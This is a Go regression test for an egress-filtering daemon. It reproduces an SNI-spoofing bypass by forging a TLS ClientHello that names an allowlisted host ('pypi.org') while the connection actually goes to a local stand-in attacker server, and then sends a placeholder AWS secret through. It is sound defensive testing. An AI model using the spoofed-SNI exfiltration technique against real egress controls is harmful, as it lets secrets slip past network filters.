package daemon

// Proof of concept for the SNI-spoofing bypass (see SECURITY.md "SNI is
// attacker-controlled"). This test exercises the REAL daemon decision + splice
// path — it is not a toy. It is gated behind EGRESS_GUARD_POC=1 so it does not
// break the normal `go test ./...` run.
//
// Run it with:
//
//	EGRESS_GUARD_POC=1 go test ./internal/daemon -run TestSNISpoofBypass -v
//
// It is written as a REGRESSION test: it FAILS today (the bypass works) and
// will PASS once the daemon binds the allow decision to the destination IP
// (the SNI<->IP binding change). Keep it after the fix as a guard.

import (
	"context"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/byliu-labs/egress-guard/internal/allowlist"
	"github.com/byliu-labs/egress-guard/internal/decisionlog"
	"github.com/byliu-labs/egress-guard/internal/dnsbind"
)

// stubResolver maps hostnames to fixed IP sets — deterministic DNS for tests.
// It models what a hostname *legitimately* resolves to; the attacker IP is
// deliberately absent from every entry.
type stubResolver map[string][]net.IP

func (s stubResolver) LookupIP(_ context.Context, _, host string) ([]net.IP, error) {
	if ips, ok := s[host]; ok {
		return ips, nil
	}
	return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
}

// recorder stands in for the ATTACKER's exfiltration server. It has no
// relationship to pypi.org — it is simply an IP the attacker controls. It
// records every byte it receives so the test can assert the secret arrived.
type recorder struct {
	ln   net.Listener
	mu   sync.Mutex
	data []byte
}

func newRecorder(t *testing.T) *recorder {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("recorder listen: %v", err)
	}
	r := &recorder{ln: ln}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				buf := make([]byte, 4096)
				for {
					c.SetReadDeadline(time.Now().Add(2 * time.Second))
					n, err := c.Read(buf)
					if n > 0 {
						r.mu.Lock()
						r.data = append(r.data, buf[:n]...)
						r.mu.Unlock()
					}
					if err != nil {
						return
					}
				}
			}(c)
		}
	}()
	return r
}

func (r *recorder) received() string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return string(r.data)
}

// spoofedClientHello builds a syntactically valid TLS 1.2 ClientHello whose SNI
// is exactly `sni` — regardless of where the connection is actually going. A
// malicious client controls this field completely; nothing forces it to name
// its true destination.
func spoofedClientHello(sni string) []byte {
	body := []byte{0x03, 0x03}                  // client_version = TLS 1.2
	body = append(body, make([]byte, 32)...)    // random
	body = append(body, 0x00)                   // session_id length = 0
	body = append(body, 0x00, 0x02, 0x13, 0x01) // cipher_suites: TLS_AES_128_GCM_SHA256
	body = append(body, 0x01, 0x00)             // compression_methods: null

	var sniExt []byte
	listLen := uint16(3 + len(sni))
	sniExt = append(sniExt, byte(listLen>>8), byte(listLen))
	sniExt = append(sniExt, 0x00) // name_type = host_name
	sniExt = append(sniExt, byte(len(sni)>>8), byte(len(sni)))
	sniExt = append(sniExt, []byte(sni)...)

	var exts []byte
	exts = append(exts, 0x00, 0x00) // extension_type = server_name
	exts = append(exts, byte(len(sniExt)>>8), byte(len(sniExt)))
	exts = append(exts, sniExt...)

	body = append(body, byte(len(exts)>>8), byte(len(exts)))
	body = append(body, exts...)

	hs := []byte{0x01, byte(len(body) >> 16), byte(len(body) >> 8), byte(len(body))}
	hs = append(hs, body...)

	rec := []byte{0x16, 0x03, 0x01, byte(len(hs) >> 8), byte(len(hs))}
	rec = append(rec, hs...)
	return rec
}

// TestSNISpoofBypass is the regression guard for the SNI-spoofing bypass.
//
// Threat-model-faithful setup:
//   - the allowlist ALLOWS "pypi.org" and denies everything else,
//   - the connection's true destination is an ATTACKER server unrelated to
//     pypi.org (as the kernel NAT lookup would report it),
//   - the client sends a ClientHello claiming SNI="pypi.org", then the secret,
//   - the daemon is configured with a dnsbind.Binder whose resolver knows the
//     real IPs for pypi.org — none of which is the attacker's IP.
//
// Secure behavior (with the SNI↔IP binding): the destination IP is not among
// pypi.org's addresses, so the connection is denied and the secret never
// reaches the attacker. Without the binding (Binder == nil) the secret is
// spliced straight through — see TestSNISpoofBypass_NoBinding_StillVulnerable
// below, which documents the pre-fix behavior.
func TestSNISpoofBypass(t *testing.T) {
	const secret = "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/EXFILTRATED"

	// pypi.org "really" resolves to these; the attacker's 127.0.0.1 is absent.
	binder := dnsbind.NewWithResolver(stubResolver{
		"pypi.org": {net.ParseIP("151.101.0.223"), net.ParseIP("151.101.64.223")},
	})

	got := runSpoofAttempt(t, binder, "pypi.org", secret)
	if strings.Contains(got, secret) {
		t.Fatalf("BYPASS: the secret was exfiltrated to the attacker despite the "+
			"SNI↔IP binding. Destination IP was not among pypi.org's addresses; "+
			"the connection should have been denied. Got attacker bytes: %q", got)
	}
}

// TestSNISpoofBypass_NoBinding_StillVulnerable documents that, with no Binder
// configured (the original v0.1/v0.2 behavior), the spoof succeeds. This is the
// baseline the binding fixes; it is gated behind EGRESS_GUARD_POC so it does
// not fail the normal suite.
func TestSNISpoofBypass_NoBinding_StillVulnerable(t *testing.T) {
	if os.Getenv("EGRESS_GUARD_POC") == "" {
		t.Skip("pre-fix demonstration; run with EGRESS_GUARD_POC=1")
	}
	const secret = "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/EXFILTRATED"
	got := runSpoofAttempt(t, nil, "pypi.org", secret)
	if !strings.Contains(got, secret) {
		t.Fatalf("expected the unbinded daemon to leak the secret, but it did not")
	}
	t.Logf("confirmed: with Binder==nil the spoofed SNI exfiltrates the secret")
}

// runSpoofAttempt stands up a daemon (optionally with binder), fires a spoofed
// ClientHello + secret at an attacker recorder, and returns what the attacker
// received. allowedHost is the single allowlisted hostname the client lies
// about in its SNI.
func runSpoofAttempt(t *testing.T, binder DestBinder, allowedHost, secret string) string {
	t.Helper()

	attacker := newRecorder(t)
	defer attacker.ln.Close()
	atkHost, atkPort := splitHostPort(attacker.ln.Addr().String())

	fk := &fakeKernel{origs: make(map[string]struct {
		IP   net.IP
		Port int
	})}
	a := allowlist.New(allowlist.Config{
		Defaults: allowlist.Layer{Allow: []string{allowedHost}},
	})
	bl, _ := decisionlog.Open(filepath.Join(t.TempDir(), "blocked.log"))
	defer bl.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	d, err := New(Options{Listen: "127.0.0.1:0", Kernel: fk, Allow: a, Log: bl, Binder: binder})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	go d.Run(ctx)
	addr := d.WaitListen()

	conn, err := net.Dial("tcp", addr.String())
	if err != nil {
		t.Fatalf("dial daemon: %v", err)
	}
	// The kernel would report the attacker's IP as the original destination.
	fk.setOrig(conn.LocalAddr().String(), net.ParseIP(atkHost), atkPort)

	if _, err := conn.Write(spoofedClientHello(allowedHost)); err != nil {
		t.Fatalf("write clienthello: %v", err)
	}
	if _, err := conn.Write([]byte(secret)); err != nil {
		t.Fatalf("write secret: %v", err)
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if strings.Contains(attacker.received(), secret) {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	conn.Close()
	return attacker.received()
}
